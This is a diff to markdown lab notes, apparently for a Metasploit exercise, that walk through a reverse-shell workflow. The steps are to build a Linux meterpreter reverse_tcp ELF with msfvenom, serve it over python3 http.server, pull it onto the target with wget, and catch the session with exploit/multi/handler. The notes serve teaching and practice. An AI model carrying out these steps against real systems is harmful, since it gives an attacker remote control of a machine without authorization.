@@ -28,14 +28,15 @@
 
 ### Note: All of the examples above are reverse payloads. This means we need to have the exploit/multi/handler module listening on attacking/local machine to work as a handler, need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same we have used when creating the msfvenom payload.
 
-## Task1:
-- Do ssh to Target VM > ssh username@targetVM_IP
+## Task1: Create Payload, Transfer to Target VM, Get Meterpreter
+- Do ssh to Target VM > ssh username@targetVM_IP > sudo su
 - Create Payload on Local VM > msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
 - Transfer the payload to Target VM > 
 - - a. First Create a server on Local VM > python3 -m http.server 9000 (change permission of file eg. chmod 777 file_name)
-- - b. use on Target VM terminal or in ssh session wget http://LocalVM_IP/file_name.format
+- - b. Use on Target VM terminal or in ssh session wget http://LocalVM_IP/file_name.format
 - Get a meterpreter session on the target machine > 
-- - a. Start the Metasploit handler: use exploit/multi/handler
-- - b. set payloads, lhost, lport (check show option)
+- - a. Start the Metasploit handler before executing the transfered payload on target VM: use exploit/multi/handler
+- - b. set payloads(Specific to Linux), lhost, lport (check show option) (Use same lport, lhost what used while creating payload)
 - - c. run > meterpreter session must have started after executing the "transfered payload" on target VM
+
  
